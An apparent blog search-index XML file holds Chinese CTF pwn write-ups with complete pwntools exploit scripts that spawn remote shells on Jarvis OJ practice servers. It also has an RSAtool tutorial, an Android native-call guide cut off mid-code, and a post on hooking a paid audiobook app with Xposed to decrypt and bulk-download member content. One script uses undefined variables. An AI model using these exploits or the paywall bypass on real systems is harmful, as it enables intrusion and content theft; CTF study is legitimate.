<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>X-MAN(level0~level2)</title>
    <url>/2017/02/24/X-MAN-level0-level2/</url>
    <content><![CDATA[<p>题目资源在<a href="https://www.jarvisoj.com" target="_blank" rel="external">这里</a><br><a id="more"></a><br>这几个题目比较简单，就不一一详细描述了，exp如下：</p>
<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>栈溢出十分明显，程序里自带callsystem的函数，看了一下，就是调用/bin/sh，直接跳转过去就好</p>
<pre><code>from pwn import *
#p=process(&apos;./level0&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)

call_system=0x0000000000400596
payload=&apos;a&apos;*136+p64(call_system)
p.send(payload)
p.interactive()
</code></pre><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>同样是很简单的栈溢出，弄清楚shellcode的存放地址</p>
<pre><code>from pwn import *
# p = process(&apos;./level1&apos;)  # local
p = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)  # remote
p.recvuntil(&apos;:&apos;)
address = p.recvuntil(&apos;?&apos;, drop=True)
address = int(address, 16)
print address
junk = &apos;a&apos; * 0x88
ebp = &apos;aaaa&apos;
retaddr = address + 0x88 + 4 + 4
shellcode = &quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f&quot; \
    &quot;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0&quot; \
    &quot;\x0b\xcd\x80\n&quot;
payload = junk + ebp + p32(retaddr) + shellcode
p.send(payload)
p.interactive()
</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>还是栈溢出，搜索字符串发现bss段里有“/bin/sh”,可以直接调用。注意p32(4)是虚构的返回地址，随便是申都可以。</p>
<pre><code>from pwn import *

#p=process(&apos;./level2&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9878)

systemadd=0x08048320
shelladd=0x0804A024

payload=&apos;a&apos;*140+p32(systemadd)+p32(4)+p32(shelladd)

p.send(payload)
p.interactive()
</code></pre><h3 id="level2-x86"><a href="#level2-x86" class="headerlink" title="level2_x86"></a>level2_x86</h3><p>本题主要考察的是64位下参数的传递顺序，从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9，之后所有的参数通过栈来传递。本题的关键在于将/bin/sh放在RDI寄存器中。</p>
<pre><code>from pwn import *

#p=process(&apos;./level2_x64&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9882)

level2=ELF(&apos;./level2_x64&apos;)
systemadd=level2.plt[&apos;system&apos;]
print hex(systemadd)

shelladd=0x00600a90
rdiret=0x00000000004006b3

payload=&apos;a&apos;*128+&quot;b&quot;*8+p64(rdiret)+p64(shelladd)+p64(systemadd)

p.send(payload)
p.interactive()
</code></pre>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>RSAtool使用方法</title>
    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
(N=322831561921859 e = 23)
请解密出明文，提交时请将数字转化为ascii码提交
比如你解出的明文是0x6162，那么请提交字符串ab
提交格式:PCTF{明文字符串}
</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
p = 3487583947589437589237958723892346254777 
q = 8767867843568934765983476584376578389
e = 65537
求d = 
请提交PCTF{d}
</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
]]></content>
      <tags>
        <tag>密码学</tag>
        <tag>工具</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>X-MAN-level3</title>
    <url>/2017/02/24/X-MAN-level3/</url>
    <content><![CDATA[<p>本题主要考察通过延迟绑定技术泄漏函数的真实地址，<a href="http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">延迟绑定技术</a>,通过GDB调试会发现程序开启了NX保护。而且也找不到system函数和bin/sh，<br><a id="more"></a><br>首先需要泄漏write函数的地址用来求出system和bin/sh的实际地址，构造payload=‘A’*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)<br>返回地址改为溢出发现的函数地址是为了接下来第二个payload的构造，因为函数每次运行的个函数的实际地址是不同的。后面的三个是write函数的三个参数，通过延迟绑定原理将write的实际地址写出来。</p>
<p>第二个payload就是直接修改返回地址为system真实地址再加上bin/sh的地址就可以实现利用。脚本如下：</p>
<pre><code>from pwn import *

#p=process(&apos;./level3&apos;)
#libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
#context.log_level = &apos;debug&apos;
p=remote(&apos;pwn2.jarvisoj.com&apos;,9879)

level2=ELF(&apos;./level3&apos;)
libc=ELF(&apos;libc-2.19.so&apos;)
#offest
writeoffest = libc.symbols[&apos;write&apos;]
print writeoffest
systemoffest = libc.symbols[&apos;system&apos;]
print systemoffest
binshoffest=0x0016084C
#plt
writeplt=0x08048340
#got
writegot=0x0804A018
#addr
basebss = 0x0804A024
pop3ret = 0x08048519
vuladdr = 0x0804844B

payload=&apos;A&apos;*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)

p.recvuntil(&apos;Input:\n&apos;)
p.send(payload)
writeaddr=u32(p.recv(4))
print writeaddr

systemaddr = writeaddr - writeoffest + systemoffest
binshaddr = writeaddr - writeoffest + binshoffest

payload=&apos;a&apos;*140+p32(systemaddr)+p32(4)+p32(binshaddr)

p.send(payload)
p.interactive()
</code></pre>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>XMAN-Level3-x64</title>
    <url>/2017/02/27/XMAN-Level3-x64/</url>
    <content><![CDATA[<p>这个题目和XMAN-Level2-x64考察目的是一样的，都是考察在x64中传参数的问题，这个题目是如何考察在x64中传多个参数。<br><a id="more"></a></p>
<p>由于本题目需要通过write泄漏实际地址，因此需要传递多个参数，rdx这个寄存器在程序中没有找到合适的gadget，但是通过调试会发现rdx这个值比较大，我们需要传入的也是一个较大的值便于进行write和read，这样就可以不用设置这样一个rdx的值。</p>
<p>还有个问题是在运行脚本的时候发现，目标机上程序调用的并不是给的那个库，而是libc.so.6。脚本如下：</p>
<pre><code>from pwn import *
# p = process(&apos;./level3_x64&apos;)  # local
libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
# context.log_level = &apos;debug&apos;
p = remote(&apos;pwn2.jarvisoj.com&apos;, 9883)  # remote
# libc = ELF(&apos;libc-2.19.so&apos;)  # remote
elf = ELF(&apos;./level3_x64&apos;)
# offest
readoffest = libc.symbols[&apos;read&apos;]
systemoffest = libc.symbols[&apos;system&apos;]
# plt
readplt = elf.plt[&apos;read&apos;]
writeplt = elf.plt[&apos;write&apos;]
# got
readgot = elf.got[&apos;read&apos;]
# addr
basebss = elf.bss()
rdiret = 0x00000000004006b3
rsiret = 0x00000000004006b1
vuladdr = 0x00000000004005E6
payload = &quot;A&quot;*136 
payload+= p64(rdiret) + p64(1) #write函数的第一个参数 
payload+= p64(rsiret) + p64(readgot) #write函数的第二个参数，待显示字符串的首地址
payload+= p64(8) #write函数的第三个参数，待显示字符串的字节数
payload+= p64(writeplt) + p64(vuladdr)
p.recvuntil(&apos;Input:\n&apos;)
# gdb.attach(p)
p.send(payload)
readaddr = u64(p.recv(8))
systemaddr = readaddr - readoffest + systemoffest
payload  = &quot;A&quot;*136 
payload += p64(rdiret) + p64(0) #read函数的第一个参数，stdin
payload += p64(rsi2ret) + p64(basebss)#read函数的第二个参数，待写入地址空间的首地址
payload += p64(888)  #read函数的第三个参数，待写入字符串的长度
payload += p64(readaddr)
payload += p64(rdiret) #read函数的第一个参数
payload += p64(basebss) #read函数的第二个参数，待写入地址空间的首地址 
payload += p64(systemaddr) 
sh.send(payload)
sh.send(&apos;/bin/sh\x00&apos;)
sh.interactive()
</code></pre>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>XMAN-level4</title>
    <url>/2017/02/28/XMAN-level4/</url>
    <content><![CDATA[<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
</code></pre><p>也可以重新返回vuln：</p>
<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
</code></pre><p>脚本如下：</p>
<pre><code>from pwn import *

#p=process(&apos;./level4&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
level4=ELF(&apos;./level4&apos;)

#plt
write_plt=0x08048340
read_plt=0x08048310

#addr
main=level4.symbols[&apos;main&apos;]
basebss=level4.bss()
pppr=0x08048509

def leak(address):
        payload=&apos;A&apos;*140
    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
        p.send(payload)
        data =p.recv(4)
    print &quot;%#x %s&quot; % (address, data)
        return data


d = DynELF(leak, elf=ELF(&apos;./level4&apos;))

system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
log.success(&apos;leak system address: &apos; + hex(system_addr))

payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
p.send(payload2)
p.send(&apos;/bin/sh\x00&apos;)
p.interactive()
</code></pre>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Xposed利用----为自己搞点小福利</title>
    <url>/2020/09/07/Xposed%E5%88%A9%E7%94%A8-%E4%B8%BA%E8%87%AA%E5%B7%B1%E6%90%9E%E7%82%B9%E5%B0%8F%E7%A6%8F%E5%88%A9/</url>
    <content><![CDATA[<p>最近睡前喜欢听一听鬼吹灯，在某听书软件上发现需要购买会员才可以免费听，但是每天也就听个一两集，感觉包月买会员有点不值当，刚好最近要把好久没用的Xposed复习一波的想法，买一个月的会员把自己想要听的书都下载下来，为自己搞一点小福利。<br><a id="more"></a></p>
<h1 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h1><p>想要模拟应用下载资源的过程，首先需要抓包分析我们到底需要模拟哪些数据包，什么参数需要通过Xposed插件来Hook或者调用获取。</p>
<ul>
<li><p>请求对应书籍的章节列表，下图是书籍首页列表，每次上拉刷新20个章节，第二页请求与第一页有一些差别。<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly1.png" alt=""><br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly4.png" alt=""><br>通过请求章节列表来获取章节id以及章节名用于给下载好的文件命名。</p>
</li>
<li><p>通过下述请求获取到的track_id来请求每个章节返回的下载链接，下载链接包含在返回的ep和fileId中，这两个参数都被加密了。<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly2.png" alt=""></p>
</li>
<li>在解密ep和fileid之后，直接请求download_url即可获得音频文件，保存到本地即可。<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly3.png" alt=""></li>
</ul>
<h1 id="分析调试，定位关键函数"><a href="#分析调试，定位关键函数" class="headerlink" title="分析调试，定位关键函数"></a>分析调试，定位关键函数</h1><p>通过在ep和fileid下断点，动态调试定位到解密这两个字段的位置及函数</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly5.png" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly6.png" alt=""></p>
<p>进一步调试发现两个解密函数都在EncryptUtil这个类中，因此后续只需要想办法通过Xposed调用这两个函数即可</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly7.png" alt=""></p>
<h1 id="编写Xposed插件"><a href="#编写Xposed插件" class="headerlink" title="编写Xposed插件"></a>编写Xposed插件</h1><p>想要通过python编写脚本与Xposed插件进行通信，传输数据可以采取socket或者搭建http服务器两种方式，这里我采取了通过nanohttp搭建小型服务器达到数据交互的效果。</p>
<p>由于需要调用的两个函数都包含Context类型的参数，那就需要找到调用该Context的函数将其Hook获取到。<br>同时需要注意的是要调用的函数并不是static函数，因此在invoke的时候第一个参数不能为空，需要赋值函数实例，找到同在这个类中的任何一个函数进行Hook获取其实例。</p>
<p>我这里Hook了同类中一个native函数，获取实例及Context。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly8.png" alt=""></p>
<p>之后通过接收python客户端传的ep和file_id参数及Android服务端Hook获取到的方法实例及Context参数进行invoke调用</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly9.png" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly10.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文主要是为了记录一下在复习Xposed利用所学习到的一些东西进行技术交流，禁止用来做非法恶意事情，否则后果自付！如有侵权，请联系作者删除。</p>
<p>详细代码地址 <a href="https://gitee.com/yunnigu/Xposed_project" target="_blank" rel="external">https://gitee.com/yunnigu/Xposed_project</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Hook</tag>
        <tag>Xposed</tag>
      </tags>
  </entry>
  <entry>
    <title>Android强调native函数的两种方法</title>
    <url>/2020/04/29/Android%E5%BC%BA%E8%B0%83native%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。<br><a id="more"></a></p>
<h1 id="通过导出函数调用native函数"><a href="#通过导出函数调用native函数" class="headerlink" title="通过导出函数调用native函数"></a>通过导出函数调用native函数</h1><p>一般普通的native函数都是有导出函数的，因此只要找到导出函数名即可调用该native函数。</p>
<h2 id="寻找导出函数"><a href="#寻找导出函数" class="headerlink" title="寻找导出函数"></a>寻找导出函数</h2><p>首先在java层找到native函数的调用<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
<p>接下来在so中导出函数中该native函数</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
<h2 id="编写Android-APP"><a href="#编写Android-APP" class="headerlink" title="编写Android APP"></a>编写Android APP</h2><p>自己写一个带按钮的APP，调用该函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">public</span> Button button;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span></div><div class="line">		&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">	</div><div class="line">			System.loadLibrary(<span class="string">"Aes"</span>);</div><div class="line">	</div><div class="line">			<span class="keyword">try</span> </div><div class="line">			&#123;</div><div class="line">				button = (Button)findViewById(R.id.btn_test);</div><div class="line">				button.setOnClickListener(<span class="keyword">new</span> OnClickListener() </div><div class="line">				&#123;</div><div class="line">			</div><div class="line">					<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">					&#123;</div><div class="line">						<span class="keyword">try</span> </div><div class="line">						&#123;</div><div class="line">							String encrypt = Aes.aesEncode(<span class="string">"12345"</span>,</div><div class="line">									<span class="string">"350710466385995"</span>);</div><div class="line">							</div><div class="line">							<span class="keyword">if</span> (<span class="keyword">null</span> != encrypt) </div><div class="line">							&#123;</div><div class="line">		</div><div class="line">								Log.d(<span class="string">"bbk"</span>,<span class="string">"encrypt:"</span> + encrypt);</div><div class="line">							&#125;</div><div class="line">							<span class="keyword">else</span> </div><div class="line">							&#123;</div><div class="line">								Log.d(<span class="string">"bbk"</span>, <span class="string">"encrypt is NULL"</span>);</div><div class="line">							&#125;	</div><div class="line">						</div><div class="line">						&#125; </div><div class="line">						<span class="keyword">catch</span> (Exception e) </div><div class="line">						&#123;</div><div class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">							&#123;</div><div class="line">								Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">							&#125;</div><div class="line">						&#125; </div><div class="line">						</div><div class="line">					&#125;</div><div class="line">				&#125;);</div><div class="line">		</div><div class="line">			&#125; </div><div class="line">			<span class="keyword">catch</span> (Exception e) </div><div class="line">			&#123;</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">				&#123;</div><div class="line">					Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">				&#125;</div><div class="line">			&#125;  </div><div class="line">			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>模拟原APP调用类调用native函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Aes</span> </span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">aesEncode</span><span class="params">(String str, String str2)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="jni配置"><a href="#jni配置" class="headerlink" title="jni配置"></a>jni配置</h2><p>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := Aes</div><div class="line">LOCAL_SRC_FILES := libAes.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := stlport_shared</div><div class="line">LOCAL_SRC_FILES := libstlport_shared.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := my_objectname</div><div class="line">LOCAL_SRC_FILES := my_objectname.cpp</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
<h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div></pre></td></tr></table></figure>
<h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>里面写#include<jni.h>即可</jni.h></p>
<p>最后将APP安装到手机上运行即可输出调用结果</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
<h1 id="通过函数地址调用native函数"><a href="#通过函数地址调用native函数" class="headerlink" title="通过函数地址调用native函数"></a>通过函数地址调用native函数</h1><p>在逆向过程中还会遇到很多APP动态注册native函数，甚至是将导出函数隐藏的，就无法使用上述的调用方案了，本方案是通过函数地址来调用native函数，理论上只要找得到native函数在so中的地址就可以实现调用。</p>
<h2 id="寻找native函数地址"><a href="#寻找native函数地址" class="headerlink" title="寻找native函数地址"></a>寻找native函数地址</h2><p>在java层找到native函数，确定其传入参数类型及个数</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native4.jpg" alt=""></p>
<p>kxtmp函数是动态注册函数，现在字符串中搜索函数名，之后通过回溯找到函数注册地址</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native5.jpg" alt=""></p>
<h2 id="编写调用so"><a href="#编写调用so" class="headerlink" title="编写调用so"></a>编写调用so</h2><p>本方案主要是通过自己编写的so调用native函数所在的so，自己的so名为hookso<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">			</div><div class="line">			System.loadLibrary(<span class="string">"hookso"</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">float</span> value =TypedValue.complexToFloat(<span class="number">55297</span>);</div><div class="line">			Log.e(<span class="string">"DEBUG"</span>, <span class="string">": "</span> + value);</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">			<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></div><div class="line">			getMenuInflater().inflate(R.menu.main, menu);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">			<span class="comment">// Handle action bar item clicks here. The action bar will</span></div><div class="line">			<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></div><div class="line">			<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></div><div class="line">			<span class="keyword">int</span> id = item.getItemId();</div><div class="line">			<span class="keyword">if</span> (id == R.id.action_settings) &#123;</div><div class="line">				JNI.testfunc();</div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNI</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testfunc</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="jni配置-1"><a href="#jni配置-1" class="headerlink" title="jni配置"></a>jni配置</h2><h3 id="Android-mk-1"><a href="#Android-mk-1" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"></div><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := hookso</div><div class="line">LOCAL_SRC_FILES := hookso.cpp</div><div class="line"></div><div class="line">LOCAL_LDLIBS += -llog  #<span class="built_in">log</span></div><div class="line"></div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
<h3 id="Application-mk-1"><a href="#Application-mk-1" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div><div class="line">APP_STL := c++<span class="number">_</span>shared</div><div class="line">APP_CPPFLAGS := -fexceptions -frtti</div></pre></td></tr></table></figure>
<h3 id="hookso-cpp"><a href="#hookso-cpp" class="headerlink" title="hookso.cpp"></a>hookso.cpp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/un.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">u_int32_t</span> <span class="params">(*<span class="keyword">common_func_t</span>)</span><span class="params">(<span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"DEBUG"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(lvl, fmt, args...) __android_log_print(lvl, \</span></div><div class="line">		LOG_TAG, fmt, ##args)</div><div class="line"></div><div class="line"><span class="function"><span 